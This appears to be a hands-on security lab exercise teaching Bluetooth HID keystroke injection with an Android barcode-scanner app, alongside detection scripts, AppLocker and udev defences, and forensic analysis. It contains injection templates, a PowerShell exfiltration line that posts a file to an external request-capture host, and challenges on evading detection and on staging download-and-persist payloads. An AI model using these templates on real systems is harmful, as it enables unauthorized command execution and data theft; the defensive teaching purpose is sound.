# Exercise 1: HID Injection Basics

## Overview

In this exercise, you'll learn the fundamentals of HID injection attacks using the HID Barcode Scanner app. You'll understand how keystroke injection works, practice safe testing techniques, and learn to defend against such attacks.

## Learning Objectives

- Understand HID protocol basics
- Configure HID Barcode Scanner for testing
- Perform controlled keystroke injection
- Detect HID injection attempts
- Implement defensive measures

## Prerequisites

- HID Barcode Scanner app installed on Android device (Android 9+)
- Test computer (Windows/Linux/macOS)
- Bluetooth 4.0+ on computer
- Administrative access to test computer
- Isolated test environment (DO NOT use production systems)

## Lab Setup

### Part 1: Environment Preparation

**1.1 Set up Test Computer**

Create an isolated test VM or use a dedicated test machine:

```bash
# Linux: Create test user
sudo adduser hidtest
sudo passwd hidtest

# Windows: Create test user via
# Settings > Accounts > Family & other users > Add someone else to this PC
```

**1.2 Install Monitoring Tools**

**Windows**:
```powershell
# Enable PowerShell script execution logging
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# Enable process creation auditing
auditpol /set /category:"Detailed Tracking" /success:enable

# Check Event Viewer: Windows Logs > Security
```

**Linux**:
```bash
# Install and configure auditd
sudo apt-get install auditd audispd-plugins

# Monitor keyboard events
sudo evtest

# Alternative: Use showkey
sudo showkey
```

**macOS**:
```bash
# Enable keyboard logging (for testing only!)
sudo log stream --predicate 'eventMessage contains "keyboard"'
```

**1.3 Configure HID Barcode Scanner**

1. Open HID Barcode Scanner app
2. Go to Settings
3. Note these important settings:
   - **Connection Mode**: Ensure "HID Keyboard" is selected
   - **Keyboard Layout**: Match your test computer's layout (e.g., US)
   - **Auto Send**: Enable for automatic keystroke transmission
   - **Custom Keys**: We'll configure this later

### Part 2: Basic Connectivity

**2.1 Pair Devices**

On Android:
1. Open HID Barcode Scanner
2. Tap "Devices"
3. Tap "Scan for devices"
4. Select your test computer

On Computer:
1. Accept pairing request
2. Confirm pairing code (if prompted)
3. Wait for connection confirmation

**2.2 Test Basic Input**

1. On Android: Navigate to Scanner screen
2. Ensure computer has a text editor open (Notepad, TextEdit, gedit)
3. Place cursor in text editor
4. Use HID Scanner to scan or manually enter: `HELLO WORLD`
5. Verify text appears on computer

**Expected Result**: "HELLO WORLD" should appear in your text editor.

**If it doesn't work**:
- Check keyboard layout setting matches computer
- Verify HID profile is connected (not just paired)
- Restart both devices
- Check [Troubleshooting Guide](../02-bluetooth-hid-protocol.md#troubleshooting)

## Exercise Tasks

### Task 1: Understanding HID Codes

**Objective**: Learn the relationship between characters and HID codes.

**1.1 Character to HID Code Mapping**

Research and document HID codes:

| Character | HID Code | Modifier | Notes |
|-----------|----------|----------|-------|
| a | 0x04 | None | Lowercase |
| A | 0x04 | Shift (0x02) | Uppercase |
| 1 | 0x1E | None | Number row |
| ! | 0x1E | Shift (0x02) | Shift+1 |
| Enter | 0x28 | None | Return key |
| Tab | 0x2B | None | Tab key |

**1.2 Keyboard Layout Impact**

Test layout differences:

1. Configure HID Scanner with US layout
2. Computer set to US layout
3. Send: `QWERTY`
4. **Expected**: QWERTY appears

Now change:
1. Change computer layout to German (QWERTZ)
2. Do NOT change HID Scanner layout (keep US)
3. Send: `QWERTY`
4. **Expected**: QWERTZ appears (Y and Z swapped)

**Question**: Why does this happen?
<details>
<summary>Answer</summary>
HID sends raw key codes, not characters. The OS interprets codes based on its active keyboard layout. HID Scanner uses US layout (sends code for Y), but German layout interprets that code as Z.
</details>

**Security Implication**: Attacker must know target's keyboard layout for accurate injection.

### Task 2: Command Injection

**Objective**: Execute commands via HID injection.

**⚠️ WARNING**: Only perform on your test system with explicit permission.

**2.1 Windows Command Injection**

**Simple Calculator Launch**:

1. Configure HID Scanner with the following:
   - Go to Settings > Custom Keys
   - Add custom key combination

2. Create a barcode or manual input that will:
   - Press Windows key + R (open Run dialog)
   - Type `calc`
   - Press Enter

**Using Template System**:

In HID Scanner, go to Settings > Template:

```
{{GUI}}r{{DELAY 100}}calc{{ENTER}}
```

Explanation:
- `{{GUI}}`: Windows/Command key
- `r`: Types 'r' (combined with GUI = Win+R)
- `{{DELAY 100}}`: Wait 100ms for dialog to open
- `calc`: Types "calc"
- `{{ENTER}}`: Presses Enter

3. Scan or send this template
4. Calculator should open

**2.2 Linux Command Injection**

**Open Terminal and Execute Command**:

Template:
```
{{CTRL}}{{ALT}}t{{DELAY 500}}echo "HID Injection Test"{{ENTER}}
```

Explanation:
- `{{CTRL}}{{ALT}}t`: Open terminal (common Ubuntu shortcut)
- `{{DELAY 500}}`: Wait for terminal to open
- Types echo command
- `{{ENTER}}`: Execute

**2.3 macOS Command Injection**

Template:
```
{{GUI}}{{SPACE}}{{DELAY 200}}terminal{{DELAY 200}}{{ENTER}}{{DELAY 500}}echo "HID Test"{{ENTER}}
```

Explanation:
- `{{GUI}}{{SPACE}}`: Open Spotlight
- Types "terminal"
- Opens Terminal
- Executes echo command

**Task Questions**:

1. What happens if the delay is too short?
2. How can you chain multiple commands?
3. What defensive measures could detect this?

### Task 3: Data Exfiltration Simulation

**Objective**: Understand how HID can be used to steal data.

**⚠️ ETHICAL NOTICE**: This is for educational purposes on YOUR OWN system only.

**3.1 Simple File Read (Windows)**

Create a test file:
```powershell
echo "Sensitive Data: CONFIDENTIAL-12345" > C:\Users\hidtest\Desktop\test.txt
```

HID Template to read and "exfiltrate":
```
{{GUI}}r{{DELAY 100}}powershell{{ENTER}}{{DELAY 1000}}Get-Content C:\Users\hidtest\Desktop\test.txt | Invoke-WebRequest -Uri http://requestbin.net/your-endpoint -Method POST -Body $input{{ENTER}}
```

**Note**: Replace `requestbin.net/your-endpoint` with a request capture service (RequestBin, webhook.site, or your own server)

**What Happens**:
1. Opens PowerShell
2. Reads file content
3. Sends content to external server via HTTP POST

**3.2 Detection Exercise**

Before running the exfiltration:

**Windows**:
```powershell
# Monitor for new PowerShell processes
Get-EventLog -LogName Security -After (Get-Date).AddMinutes(-5) | 
Where-Object {$_.EventID -eq 4688 -and $_.Message -like "*powershell*"}
```

**Linux**:
```bash
# Monitor command execution
sudo auditctl -w /bin/bash -p x -k command_exec
sudo ausearch -k command_exec -ts recent
```

**Question**: Did you detect the exfiltration attempt?

### Task 4: Keystroke Speed Analysis

**Objective**: Understand timing characteristics of HID injection.

**4.1 Human Typing Speed**

Manually type this sentence and time yourself:
```
The quick brown fox jumps over the lazy dog.
```

Record time: _____ seconds

Average human: 5-7 seconds

**4.2 HID Injection Speed**

Use HID Scanner to send the same sentence with minimal delay.

Template:
```
The quick brown fox jumps over the lazy dog.
```

Record time: _____ seconds

HID injection: < 1 second (nearly instantaneous)

**4.3 Detection Based on Speed**

**Detection Script (Python)**:

```python
import time
from pynput import keyboard

class KeystrokeAnalyzer:
    def __init__(self):
        self.keystrokes = []
        self.start_time = None
    
    def on_press(self, key):
        current_time = time.time()
        
        if self.start_time is None:
            self.start_time = current_time
        
        self.keystrokes.append({
            'key': key,
            'time': current_time
        })
        
        # Analyze last 10 keystrokes
        if len(self.keystrokes) >= 10:
            self.analyze_timing()
    
    def analyze_timing(self):
        recent = self.keystrokes[-10:]
        intervals = []
        
        for i in range(1, len(recent)):
            interval = recent[i]['time'] - recent[i-1]['time']
            intervals.append(interval)
        
        avg_interval = sum(intervals) / len(intervals)
        
        # Human typing: 50-200ms per keystroke
        # HID injection: < 10ms per keystroke
        
        if avg_interval < 0.01:  # Less than 10ms
            print(f"[!] ALERT: Possible HID injection detected!")
            print(f"    Average interval: {avg_interval*1000:.2f}ms")
            print(f"    Recent keys: {[str(k['key']) for k in recent]}")
    
    def start_monitoring(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# Run the detector
analyzer = KeystrokeAnalyzer()
analyzer.start_monitoring()
```

**Test**:
1. Run the detection script
2. Type normally - should not alert
3. Use HID injection - should alert

**Question**: What are the limitations of speed-based detection?

### Task 5: Defense Implementation

**Objective**: Implement and test defensive measures.

**5.1 Application Whitelisting (Windows)**

Enable AppLocker:

```powershell
# Create AppLocker policy (PowerShell as Admin)
$rule = New-AppLockerPolicy -RuleType Publisher -User Everyone -ProductName "cmd.exe" -BinaryName "*" -BinaryVersionRange "*" -Action Deny

Set-AppLockerPolicy -PolicyObject $rule -Merge
```

**Test**: Try HID injection to open cmd.exe - should be blocked

**5.2 Bluetooth HID Filtering (Linux)**

Create udev rule to restrict HID devices:

```bash
sudo nano /etc/udev/rules.d/99-hid-restrict.rules
```

Add:
```
# Only allow known HID devices
SUBSYSTEM=="input", ATTRS{name}=="*Bluetooth*", ATTRS{uniq}!="AA:BB:CC:DD:EE:FF", MODE="0000"
```

Replace `AA:BB:CC:DD:EE:FF` with your trusted device MAC.

Reload rules:
```bash
sudo udevadm control --reload-rules
sudo udevadm trigger
```

**5.3 Command Monitoring (PowerShell)**

Create a monitoring script:

```powershell
# Monitor-HIDBehavior.ps1

$lastCommandTime = Get-Date

while ($true) {
    Start-Sleep -Milliseconds 100
    
    # Check for rapid command execution
    $recentCommands = Get-EventLog -LogName Security -After (Get-Date).AddSeconds(-1) -ErrorAction SilentlyContinue |
        Where-Object {$_.EventID -eq 4688}
    
    if ($recentCommands.Count -gt 5) {
        Write-Host "[!] ALERT: Multiple processes created in 1 second!" -ForegroundColor Red
        $recentCommands | Format-Table TimeGenerated, Message -AutoSize
        
        # Optional: Lock workstation
        # rundll32.exe user32.dll,LockWorkStation
    }
}
```

Run in background:
```powershell
Start-Job -FilePath .\Monitor-HIDBehavior.ps1
```

**Test**: Attempt HID injection - should be detected

### Task 6: Forensic Analysis

**Objective**: Investigate HID injection incident.

**Scenario**: A coworker suspects their computer was accessed via HID injection while they were at lunch.

**6.1 Windows Event Log Analysis**

```powershell
# Find Bluetooth connection events
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Bluetooth-BthLEPrepairing/Operational'; StartTime=(Get-Date).AddHours(-4)} | 
    Format-Table TimeCreated, Id, Message -AutoSize

# Find process creation
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddHours(-4)} |
    Format-Table TimeCreated, Properties -AutoSize

# Look for PowerShell execution
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell'; Id=400; StartTime=(Get-Date).AddHours(-4)} |
    Format-Table TimeCreated, Message -AutoSize
```

**6.2 Network Analysis**

```powershell
# Check for unusual outbound connections
Get-NetTCPConnection -State Established | 
    Where-Object {$_.RemotePort -notin @(80, 443)} |
    Format-Table LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess -AutoSize
```

**6.3 Timeline Reconstruction**

Create a timeline of events:

| Time | Event | Evidence |
|------|-------|----------|
| 12:05 PM | Bluetooth device connected | Event ID: XXX |
| 12:06 PM | PowerShell executed | Event ID: 4688 |
| 12:06 PM | File accessed | File access log |
| 12:07 PM | Network connection to external IP | Netstat |
| 12:08 PM | Bluetooth device disconnected | Event ID: XXX |

**Deliverable**: Write an incident report describing the attack.

## Challenge Tasks

### Challenge 1: Anti-Detection

**Goal**: Modify HID injection to evade speed-based detection.

**Hint**: Add random delays to mimic human typing:

```
{{DELAY 50-150}}H{{DELAY 50-150}}E{{DELAY 50-150}}L{{DELAY 50-150}}L{{DELAY 50-150}}O
```

Test against your detection script.

### Challenge 2: Multi-Stage Payload

**Goal**: Create a multi-stage HID attack:

1. Stage 1: Download payload from internet
2. Stage 2: Execute payload
3. Stage 3: Establish persistence

**Constraint**: Must work in under 10 seconds.

### Challenge 3: Cross-Platform Payload

**Goal**: Create a single HID injection sequence that works on Windows, Linux, and macOS.

**Hint**: Use platform-agnostic applications or detect OS first.

## Assessment

### Knowledge Check

1. What is the difference between a character and a HID code?
2. Why must HID Scanner know the keyboard layout?
3. How can timing analysis detect HID injection?
4. Name three defensive measures against HID attacks.
5. What evidence does HID injection leave on Windows systems?

### Practical Assessment

**Scenario**: You are a security consultant. A client wants to know if their organization is vulnerable to HID injection attacks.

**Deliverables**:

1. **Risk Assessment Report** (1-2 pages)
   - Describe HID injection risk
   - Assess organization's exposure
   - Provide risk rating (Low/Medium/High)

2. **Proof of Concept** (video or written demo)
   - Demonstrate HID injection on test system
   - Show impact (command execution, data access, etc.)
   - Document steps

3. **Mitigation Plan** (1 page)
   - Recommend technical controls
   - Suggest policy changes
   - Estimate implementation cost/effort

4. **Detection Strategy** (script + documentation)
   - Provide detection script
   - Explain how it works
   - Document false positive rate

## Resources

- [HID Usage Tables Specification](https://usb.org/sites/default/files/hut1_3_0.pdf)
- [MITRE ATT&CK - Input Capture](https://attack.mitre.org/techniques/T1056/)
- [Microsoft: Prevent and detect USB-based attacks](https://docs.microsoft.com/en-us/windows/security/threat-protection/)
- [NIST SP 800-53: Access Control](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)

## Next Steps

- [Exercise 2: BLE Reconnaissance →](ex02-ble-reconnaissance.md)
- [Review: Bluetooth HID Protocol](../02-bluetooth-hid-protocol.md)

---

[← Back to Exercises](../README.md#hands-on-exercises) | [Next Exercise →](ex02-ble-reconnaissance.md)
